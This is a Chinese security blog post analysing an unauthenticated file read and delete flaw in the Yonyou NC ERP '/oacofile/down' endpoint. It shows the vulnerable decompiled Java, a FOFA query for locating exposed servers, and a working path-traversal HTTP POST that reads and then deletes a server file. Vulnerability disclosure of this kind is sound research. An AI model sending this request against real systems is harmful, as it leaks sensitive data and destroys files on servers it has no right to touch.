---
title: "用友NC oacofile/down 文件读取/删除漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacofile-down-fileread-delete.html
asset_dir: assets/用友nc-oacofiledown-文件读取删除漏洞
---

# 用友NC oacofile/down 文件读取/删除漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/13 08:21
* 908浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

app

application

企业资源计划


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友)NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的 `/oacofile/down` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)+**删除漏洞**，未经身份验证的恶意攻击者利用该漏洞读取服务器上任意文件内容并删除文件，造成系统敏感信息泄露或导致系统宕机。

漏洞扫描服务

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `OACOFileSystemAction` 对应的 `down` 方法实现部分

深入探索

Web安全课程

Docker加速服务

漏洞预警服务

```
public void down(@Param(name = "filename") String fileName, @Param(name = "excelname") String excelName) throws IOException {
        fileName = StringUtil.convertToCorrectEncoding(fileName);
        excelName = URLDecoder.decode(excelName, "UTF-8");
        String tmpDirPath = ExcelUtils.getFileDirPath();
        String excelPath = tmpDirPath + fileName;
        File excel = new File(excelPath);
        if (excel.exists()) {
            OutputStream os = null;
            FileInputStream in = null;

            try {
                this.response.reset();
                this.response.setCharacterEncoding("UTF-8");
                this.response.setContentType("APPLICATION/OCTET-STREAM");
                if (LfwRuntimeEnvironment.getBrowserInfo().isIE()) {
                    this.response.setHeader("Content-Disposition", "attachment; filename=\"" + URLEncoder.encode(excelName, "UTF-8").replace("+", "%20") + "\"");
                } else if (LfwRuntimeEnvironment.getBrowserInfo().isFirefox()) {
                    this.response.setHeader("Content-Disposition", "attachment; filename=\"" + new String(excelName.getBytes("GBK"), "ISO-8859-1"));
                } else {
                    this.response.setHeader("Content-Disposition", "attachment; filename=\"" + URLEncoder.encode(excelName, "UTF-8") + "\"");
                }

                os = this.response.getOutputStream();
                in = new FileInputStream(excelPath);
                byte[] b = new byte[1024];
                int i = 0;

                while((i = in.read(b)) > 0) {
                    os.write(b, 0, i);
                }

                os.flush();
                in.close();
                in = null;
                os.close();
                os = null;
                excel.delete();
```

参数 `filename` 直接拼接进 `excelPath` 文件读取路径里，而 `tmpDirPath = ExcelUtils.getFileDirPath();` 实现如下

企业资源规划

```
public static String getFileDirPath() {
        String tmpDirPath = ncHomePath + "/hotwebs/portal/oatemp/";
        File tmpf = new File(tmpDirPath);
        if (!tmpf.exists()) {
            tmpf.mkdirs();
        }

        return tmpDirPath;
    }
```

基本路径为 `/home/hotwebs/portal/oatemp/` 此路径为nc默认安装时的基本路径，拼接后直接用 `new File` 读取文件，将内容输出在body中，且使用 `excel.delete();` 删除读取的文件。

开发工具

# 漏洞复现

> **谨慎测试，读取文件后会删除文件**！！！

```
POST /portal/pt/oacofile/down?pageId=login HTTP/1.1
Host: nc65.mrxn.net
Content-Type: application/x-www-form-urlencoded

excelname=test&filename=../../../webapps/nc_web/licence.txt
```

[![用友NC oacofile/down 文件读取/删除漏洞](images/img-001-33d7bf8a8bfd.webp)](https://image.mrxn.net/ef55fe90f48e4dcebedf380b68008833.webp)

成功读取web根目录 `licence.txt` 文件内容

漏洞扫描服务

但是文件也**被删除**了！谨慎测试！

[![用友NC oacofile/down 文件读取/删除漏洞](images/img-002-dcc12b69eff1.webp)](https://image.mrxn.net/c891273ef9184b389843cf4777a70ef0.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC oacofile/down 文件读取/删除漏洞](https://mrxn.net/jswz/yonyou-nc-oacofile-down-fileread-delete.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-oacofile-down-fileread-delete.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全工具开发

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacofile-down-fileread-delete.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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